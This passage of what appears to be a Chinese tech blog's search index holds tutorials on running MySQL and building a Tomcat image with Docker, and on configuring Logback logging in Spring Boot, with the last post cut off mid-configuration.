之九实战使用 Docker 官方的 MySQL 镜像",url:"/posts/8605ce00.html",text:'Docker 官方 MySQL 镜像的使用说明文档 https://hub.docker.com/_/mysql 使用 Docker 官方的 MySQL 镜像 系统时区设置：-e TZ=Asia/Shanghai 数据库密码设置：-e MYSQL_ROOT_PASSWORD=123456 1234567891011121314151617181920212223242526272829303132333435# 搜索所有可用的MySQL镜像# docker search mysql# 下载Docker官方提供的MySQL5.7镜像（基于Debian-Stretch）# docker pull mysql:5.7# 创建并启动（以后台方式）MySQL容器，同时挂载MySQL的数据文件目录# docker run -p 3308:3306 --name mysql5.7 \\ -v /container/mysql5.7/data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e TZ=Asia/Shanghai \\ -d mysql:5.7# 或者挂载MySQL的配置文件目录、数据文件目录、日志文件目录# docker run -p 3308:3306 --name mysql5.7 \\ -v /container/mysql5.7/conf:/etc/mysql/conf.d \\ -v /container/mysql5.7/data:/var/lib/mysql \\ -v /container/mysql5.7/logs:/var/log/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e TZ=Asia/Shanghai \\ -d mysql:5.7# 查看当前所有正在运行的容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7485feae5c64 mysql:5.7 "docker-entrypoint.s…" 7 seconds ago Up 5 seconds 33060/tcp, 0.0.0.0:3308-&gt;3306/tcp mysql5.7# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it mysql5.7 /bin/bash# MySQL相关文件目录说明：# 默认日志文件目录：/var/log/mysql# 默认数据文件目录：/var/lib/mysql# 默认配置文件路径：/etc/mysql/my.cnf# 同时默认配置文件my.cnf会分别加载/etc/mysql/conf.d 和 /etc/mysql/mysql.conf.d目录下的自定义配置文件 验证 MySQL 服务器是否可用 1234567891011121314151617181920212223# 在容器内执行登录MySQL服务器的命令# docker exec -it mysql5.7 mysql -h localhost -u root -p# 创建数据库mysql&gt; create database bbs default character set utf8;# 创建表mysql&gt; create table bbs.user(id bigint(20) not null auto_increment primary key, name varchar(25) not null) engine=innodb auto_increment=3 default charset=utf8;# 插入表数据mysql&gt; insert into bbs.user(name) values("peter");# 查询表数据mysql&gt; select * from bbs.user;+----+-------+| id | name |+----+-------+| 3 | peter |+----+-------+1 row in set (0.00 sec)# 退出登录mysql&gt; exit 开启 MySQL 远程访问的权限（仅供演示，出于数据库安全考虑，强烈不建议开启 root 用户的远程访问权限） 12345678910111213141516171819# 在容器内执行登录MySQL服务器的命令# docker exec -it mysql5.7 mysql -h localhost -u root -p# 切换数据库mysql&gt; use mysql;# 用户授权mysql&gt; grant all privileges on *.* to root@\'%\' identified by "123456";# 更新授权信息mysql&gt; flush privileges;# 退出登录mysql&gt; exit# 如果以后想在宿主机上或者外部通过MySQL客户端连接到Docker容器内的MySQL服务器，使用以下命令即可；其中192.168.1.198是Docker容器所在宿主机的IP，3308是宿主机的MySQL映射端口# mysql -h 192.168.1.198 -u root -P 3308 -p# 完成MySQL授权后，如果外部依然无法连接Docker容器内的MySQL服务器，务必检查宿主机的防火墙是否开放了MySQL的映射端口（如上面的3308端口） 备份 MySQL 数据库的数据 12# 备份MySQL所有数据库的数据# docker exec mysql5.7 sh -c \'exec mysqldump --all-databases -uroot -p"123456"\'&gt; ~/all-databases.sql 查看 MySQL 的日志信息 1234567# 显示所有日志信息# docker logs mysql5.7# 跟踪显示日志信息# docker logs -t -f --tail 5 mysql5.7# 或者进入MySQL容器内的日志目录/var/log/mysql，进一步分析日志信息 更改系统的镜像源地址，基于 Debian 9（Stretch） 123456789101112131415161718# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it mysql5.7 /bin/bash# 使用阿里云镜像站# cp /etc/apt/sources.list /etc/apt/backup.sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# 更新软件索引# apt-get update# 升级系统（非必须）# apt-get upgrade# 安装软件（非必须）# apt-get -y install vim htop net-tools var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"Docker 之八实战构建 Tomcat 服务器的 Docker 镜像",url:"/posts/79ba4cd.html",text:'实战内容介绍 编写 Dockerfile 文件，指定终端登录后的默认路径，安装 vim、ifconfig、jdk、tomcat，并配置 jdk 与 tomcat 的环境变量，最后通过 Dockerfile 文件构建新的 Docker 镜像（基于 Centos）并运行。 目录结构介绍 123456# 后续所有操作都在/root/build-tomcat目录下进行# tree /root/build-tomcat/root/build-tomcat├── apache-tomcat-7.0.77.tar.gz├── dockerfile-tomcat└── jdk1.8.0_201.tar.gz 编写 Dockerfile 文件 1234567891011121314151617181920212223242526272829FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ADD apache-tomcat-7.0.77.tar.gz /usr/localADD jdk1.8.0_201.tar.gz /usr/localRUN yum -y updateRUN yum -y install vim net-toolsENV work_path /usr/localWORKDIR $work_path# JavaENV JAVA_HOME /usr/local/jdk1.8.0_201ENV JRE_HOME /usr/local/jdk1.8.0_201/jreENV CLASSPATH .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib# TomcatENV CATALINA_HOME /usr/local/apache-tomcat-7.0.77ENV CATALINA_BASE /usr/local/apache-tomcat-7.0.77ENV PATH $PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$CATALINA_HOME/binEXPOSE 8080# ENTRYPOINT ["/usr/local/apache-tomcat-7.0.77/bin/startup.sh"]# CMD ["/usr/local/apache-tomcat-7.0.77/bin/catalina.sh", "run"]CMD /usr/local/apache-tomcat-7.0.77/bin/startup.sh &amp;&amp; tail -f /usr/local/apache-tomcat-7.0.77/logs/catalina.out 构建新的 Docker 镜像 1234567891011# 下载Centos最新的Docker镜像# docker pull centos# 进入构建目录# cd /root/build-tomcat# 创建Dockerfile文件，并写入上述的配置内容# vi dockerfile-tomcat# 通过Dockerfile文件构建新的Docker镜像# docker build -f dockerfile-tomcat -t peter/tomcat:7.0 . 查看新构建的 Docker 镜像 123456789101112131415161718192021222324252627# 查看新的Docker镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/tomcat 7.0 0e9595636ec9 15 minutes ago 796MBcentos latest 1e1148e4cc2c 6 weeks ago 202MB# 查看新Docker镜像的创建历史# docker history peter/tomcat:7.0IMAGE CREATED CREATED BY SIZE COMMENT0e9595636ec9 16 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/usr… 0Bb479edef4230 16 minutes ago /bin/sh -c #(nop) EXPOSE 8080 0Ba20730382df2 16 minutes ago /bin/sh -c #(nop) ENV PATH=/usr/local/sbin:… 0Ba5513cfc5ca9 16 minutes ago /bin/sh -c #(nop) ENV CATALINA_BASE=/usr/lo… 0Bb7be0dfd36f8 16 minutes ago /bin/sh -c #(nop) ENV CATALINA_HOME=/usr/lo… 0Be3a04651ecc3 16 minutes ago /bin/sh -c #(nop) ENV CLASSPATH=.:/usr/loca… 0B7175d3dc0385 16 minutes ago /bin/sh -c #(nop) ENV JRE_HOME=/usr/local/j… 0B216b322375a3 16 minutes ago /bin/sh -c #(nop) ENV JAVA_HOME=/usr/local/… 0B238817a0fa1a 16 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0Bd94ddbd8b1c1 16 minutes ago /bin/sh -c #(nop) ENV work_path=/usr/local 0B47d23f3fc6e9 16 minutes ago /bin/sh -c yum -y install vim net-tools 79.5MB6b892d38a8ae 17 minutes ago /bin/sh -c yum -y update 104MBd1e7e6381726 18 minutes ago /bin/sh -c #(nop) ADD file:21b3872f37d37a6dd… 397MB6efc79b6ed8b 18 minutes ago /bin/sh -c #(nop) ADD file:0581062dfa97146fd… 13.7MBb3cd54bdd2ca 18 minutes ago /bin/sh -c #(nop) MAINTAINER peter&lt;peter@gm… 0B1e1148e4cc2c 6 weeks ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) ADD file:6f877549795f4798a… 202MB 以交互式运行新构建的 Docker 镜像 12345678910111213141516# 以交互式运行新的Docker镜像，指定数据卷、端口映射、容器名称，终端会输出Tomcat启动的日志信息# docker run -it -v /container/apache-tomcat-7.0.77/logs:/usr/local/apache-tomcat-7.0.77/logs -p 8888:8080 --name="tomcat7.0-front" peter/tomcat:7.0# 退出终端（不停止容器）# ctrl + p + q# 查看当前所有正在运行的Docker容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc9544cf44667 peter/tomcat:7.0 "/bin/sh -c \'/usr/lo…" 7 seconds ago Up 5 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat7.0-front# 重新连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it tomcat7.0-front /bin/bash# 可以使用以下命令直接检测容器内安装的JDK版本，以此判断JDK是否安装成功# docker exec tomcat7.0-daemon java -version 以后台方式运行新构建的 Docker 镜像 12345678910111213# 以后台方式运行新的Docker镜像，指定数据卷、端口映射、容器名称# docker run -d -v /container/apache-tomcat-7.0.77/logs:/usr/local/apache-tomcat-7.0.77/logs -p 8888:8080 --name="tomcat7.0-daemon" peter/tomcat:7.0# 查看当前所有正在运行的Docker容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES3add0356f6a1 peter/tomcat:7.0 "/bin/sh -c \'/usr/lo…" 5 seconds ago Up 3 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat7.0-daemon# 重新连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it tomcat7.0-daemon /bin/bash# 可以使用以下命令直接检测容器内安装的JDK版本，以此判断JDK是否安装成功# docker exec tomcat7.0-daemon java -version var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化 web服务器"},{title:"SpringBoot 整合 Logback 日志框架",url:"/posts/5233fd9d.html",text:'前言 目前比较流行的日志框架有 Log4j、Logback 等，这两个框架的作者是同一个人，Logback 旨在作为流行的 Log4j 项目的后续版本，从而恢复 Log4j 离开的位置。另外&nbsp;SLF4J (Simple Logging Facade for Java)&nbsp;则是一个日志门面框架，提供了日志系统中常用的接口，Logback 和 Log4j 则对 SLF4J 进行了实现。本文将讲述如何在 Spring Boot 中应用 SLF4J + Logback 实现日志的记录。 引入依赖 Spring Boot 默认内置了 Logback 日志框架，一般只需在 Maven 中要引入 spring-boot-starter-logging 依赖。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;&lt;/dependency&gt; 但是在实际开发中不需要直接添加 spring-boot-starter-logging 依赖，因为 spring-boot-starter 其中已经包含了 spring-boot-starter-logging，该依赖的内容就是 Spring Boot 默认支持的日志框架 SLF4J + Logback。而 spring-boot-starter-web 又包含了 spring-boot-starter，所以只需要引入 Spring Boot 的 Web 组件即可。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 由于 Spring Cloud 是依赖 Spring Boot 的，因此上述 Maven 配置同样适用于 Spring Cloud 项目。 默认配置 默认情况下 Spring Boot 会将日志输出到控制台，但不会写到日志文件里。如果要写入到除控制台输出之外的日志文件中，则需在 application.properties 中设置 logging.file 或 logging.path 属性。 123456# 二者不能同时使用，若同时使用，则只有logging.file生效logging.file=文件名logging.path=日志文件路径logging.level.包名=指定包下的日志级别logging.pattern.console=日志打印规则 logging.file：设置文件，可以是绝对路径，也可以是相对路径，如：logging.file=blog.log logging.path：设置目录，会在该目录下创建 spring.log 文件，并写入日志内容，如：logging.path=/tmp/log 可以看到上述这种方式配置比较简单，但是能实现的功能也非常有限，如果想要更复杂的需求，就需要下面的 logback-spring.xml 定制化配置了。 logback-spring.xml 配置详解 Spring Boot 官方推荐使用的 XML 配置文件的名称为：logback-spring.xml，而不是 logback.xml，这是因为带 -spring 后缀的文件名可以使用 &lt;springProfile&gt; 这个标签，即在 src/main/resources 下创建 logback-spring.xml 文件。也可以使用自定义的文件名称，比如 logback-config.xml，此时只需要在 application.properties 文件中使用 logging.config=classpath:logback-config.xml 指定即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;&lt;!-- scan:当此属性设置为true时，配置文件如果发生改变，将会被重新加载，默认值为true --&gt;&lt;!-- scanPeriod:设置监测配置文件是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;&lt;!-- debug:当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- 日志上下文名称--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- 日志文件的目录路径--&gt; &lt;property name="log.path" value="/tmp/log/pricing/eureka" /&gt; &lt;!-- 彩色日志依赖的渲染类与彩色日志格式 --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;property name="CONSOLE_LOG_PATTERN" value="${CONSOLE_LOG_PATTERN:-%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(:){faint} %m%n${LOG_EXCEPTION_CONVERSION_WORD:-%wEx}}"/&gt; &lt;!--输出到控制台--&gt; &lt;appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;!--此日志appender是为开发使用，只配置最底级别，控制台输出的日志级别是大于或等于此级别的日志信息--&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;Pattern&gt;${CONSOLE_LOG_PATTERN}&lt;/Pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--输出到日志文件--&gt; &lt;!-- 时间滚动输出level为DEBUG日志 --&gt; &lt;appender name="DEBUG_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_debug.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 日志归档 --&gt; &lt;fileNamePattern&gt;${log.path}/debug/log-debug-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录DEBUG级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;debug&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为INFO日志 --&gt; &lt;appender name="INFO_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_info.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!-- 每天日志归档路径以及格式 --&gt; &lt;fileNamePattern&gt;${log.path}/info/log-info-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录INFO级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;info&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为WARN日志 --&gt; &lt;appender name="WARN_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_warn.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/warn/log-warn-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录WARN级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;warn&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- 时间滚动输出level为ERROR日志 --&gt; &lt;appender name="ERROR_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;!-- 正在记录的日志文件的路径及文件名 --&gt; &lt;file&gt;${log.path}/log_error.log&lt;/file&gt; &lt;!--日志文件输出格式--&gt; &lt;encoder&gt; &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;fileNamePattern&gt;${log.path}/error/log-error-%d{yyyy-MM-dd}.%i.log&lt;/fileNamePattern&gt; &lt;timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"&gt; &lt;maxFileSize&gt;500MB&lt;/maxFileSize&gt; &lt;/timeBasedFileNamingAndTriggeringPolicy&gt; &lt;!--日志文件保留天数--&gt; &lt;maxHistory&gt;30&lt;/maxHistory&gt; &lt;/rollingPolicy&gt; &lt;!-- 此日志文件只记录ERROR级别的 --&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;ACCEPT&lt;/onMatch&gt; &lt;onMismatch&gt;DENY&lt;/onMismatch&gt; &lt;/filter&gt; &lt;/appender&gt; &lt;!-- &lt;logger&gt;用来设置某一个包或者具体的某一个类的日志打印级别，以及指定&lt;appender&gt;。&lt;logger&gt;仅有一个name属性，一个可选的level和一个可选的addtivity属性。 name:用来指定受此logger约束的某一个包或者具体的某一个类。 level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF，还有一个特俗值INHERITED或者同义词NULL，代表强制执行上级的级别。如果未设置此属性，那么当前logger将会继承上级的级别。 addtivity:是否向上级logger传递打印信息。默认是true。 &lt;logger name="org.springframework.web" level="info"/&gt; &lt;logger name="org.springframework.scheduling.annotation.ScheduledAnnotationBeanPostProcessor" level="INFO"/&gt; --&gt; &lt;!-- 使用mybatis的时候，sql语句是debug下才会打印，而这里只配置了info，所以想要查看sql语句的话，有以下两种操作： 第一种：把&lt;root level="info"&gt;改成&lt;root level="DEBUG"&gt;这样就会打印sql，不过这样日志那边会出现很多其他消息 第二种：就是application.properties中单独给dao下目录配置debug模式，具体配置如下，这样配置sql语句会打印，其他还是正常info级别： logging.level.dao=debug logging.level.org.mybatis=debug --&gt; &lt;!-- root节点是必选节点，用来指定最基础的日志输出级别，只有一个level属性 level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF， 不能设置为INHERITED或者同义词NULL，默认是DEBUG 可以包含零个或多个元素，标识这个appender将会添加到这个logger --&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;/root&gt; &lt;!--生产环境:输出到文件--&gt; &lt;!-- &lt;springProfile name="pro"&gt; &lt;root level="info"&gt; &lt;appender-ref ref="CONSOLE" /&gt; &lt;appender-ref ref="DEBUG_FILE" /&gt; &lt;appender-ref ref="INFO_FILE" /&gt; &lt;appender-ref ref="ERROR_FILE" /&gt; &lt;appender-ref ref="WARN_FILE" /&gt; &lt;/root&gt; &lt;/springProfile&gt; --&gt; &lt;!--开发环境:打印控制台--&gt; &lt;!-- &lt;springProfile name="dev"&gt; &lt;logger name="com.nmys.view" level="debug"/&gt; &lt;/springProfile&gt; --&gt;&lt;/configuration&gt; 123&lt;springProfile name="dev"&gt; &lt;logger name="com.nmys.view" level="debug"/&gt;&lt;/springProfile&gt; 上面这段配置内容也可以直接在 YML 里面配置，如下： 123logging: level: com.nmys.view: debug 完整的 YML 配置内容如下： 1234logging: level: com.nmys.view: debug config: classpath:logback/logback-spring.xml JMX 动态修改 Logback 的日志级别 应用上线后常常会面对这样一种困境，即如果把日志级别开得太高，那么当系统出现问题时不好查，如果把日志级别定得太低，那么硬盘很可能很快就被撑爆了。这时候常常选择先将日志级别定高点，当出现问题时，再调低。大部分时候开发者习惯的做法是直接修改 Logback 的配置文件，然后重启应用。这样做当然有问题，应用跑得好好的，用户用着好好的，为什么要重启呢？谁来应对重启时客户的怒火呢？Logback 的开发者想得很周到，默认为用户提供了一种动态修改日志级别的能力，而不需要手动重启应用。配置方式很简单，只需在 Logback 的配置文件中添加以下一行内容即可： 123&lt;configuration&gt; &lt;jmxConfigurator/&gt;&lt;/configuration&gt; IDEA 彩色日志插件 上述的彩色日志需要依赖 IDEA 里的 Grep Console 插件： 日志代码性能优化 这里再说下日志输出代码，一般有人可能在代码中使用如下方式输出： 12Object entry = new SomeObject();logger.debug("The entry is " + entry); 上面看起来没什么问题，但是会存在构造消息参数的成本，即将 entry 转换成字符串相加。并且无论是否记录消息，都是如此，即那怕日志级别为 INFO，也会执行括号里面的操作，但是日志不会输出，下面是优化后的写法： 1234if(logger.isDebugEnabled()) { Object entry = new SomeObject(); logger.debug("The entry is " + entry);} 上面的写法首先对设置的日志级别进行了判断，如果为 DEBUG 日志级别，才进行参数的构造，对第一种写法进行了改善。不过还有最好的写法，使用占位符： 12Object entry = new SomeObject();logger.debug("The entry is {}.", entry); 只有在评估是否记录之后，并且在决策是肯定的情况下，记录器实现才会格式化消息并将 {} 对替换为条目的字符串值。换句话说，当禁用日志语句时，此代码不会产生参数构造的成本。Logback 作者进行测试得出：第一种和第三种写法将产生完全相同的输出。但是，在禁用日志记录的情况下，第三个变体将比第一个变体优于至少 30 倍性能。 如果有多个参数，写法如下： 1logger.debug("The new entry is {}. It replaces {}.", entry, oldEntry); 如果需要传递三个或更多参数，则还可以使用 Object [] 变体： 12Object[] paramArray = {newVal, below, above};logger.debug("Value {} was inserted between {} and {}.", paramArray); 记录日志的时候可能需要在文件中记录下异常的堆栈信息，经过测试，logger.error(e) 可能不会打印出堆栈信息，正确的写法是： 1logger.error("程序异常, 详细信息:{}", e.getLocalizedMessage(), e); MyBatis Plus 打印 SQL 日志 在 MyBatis-Plus 的配置中，加入 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 即可 1234mybatis-plus: mapper-locations: classpath:/mapper/*.xml configuration: log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 企业项目开发配置实例 ★展开配置内容★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;&lt;!-- scan:当此属性设置为true时，配置文件如果发生改变，将会被重新加载，默认值为true --&gt;&lt;!-- scanPeriod:设置监测配置文件是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;&lt;!-- debug:当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;&lt;configuration scan="true" scanPeriod="60 seconds" debug="false"&gt; &lt;!-- JMX 支持--&gt; &lt;jmxConfigurator/&gt; &lt;!-- 日志上下文名称--&gt; &lt;contextName&gt;logback&lt;/contextName&gt; &lt;!-- 日志文件的目录路径--&gt; &lt;property name="log.path" value="/tmp/log/pricing/eureka" /&gt; &lt;!-- 彩色日志依赖的渲染类与彩色日志格式 --&gt; &lt;conversionRule conversionWord="clr" converterClass="org.springframework.boot.logging.logback.ColorConverter" /&gt; &lt;conversionRule conversionWord="wex" converterClass="org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter" /&gt; &lt;conversionRule conversionWord="wEx" converterClass="org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter" /&gt; &lt;property name="CONSOLE_LOG_PATTERN" value="${CONSOLE_LOG_PATTERN:-%clr(%d{yyyy-MM-dd HH:mm:ss.SSS}){faint} %clr(${LOG_LEVEL_PATTERN:-%5p}) %clr(${PID:- }){magenta} %clr(---){faint} %clr([%15.15t]){faint} %clr(%-40.40logger{39}){cyan} %clr(:){faint} 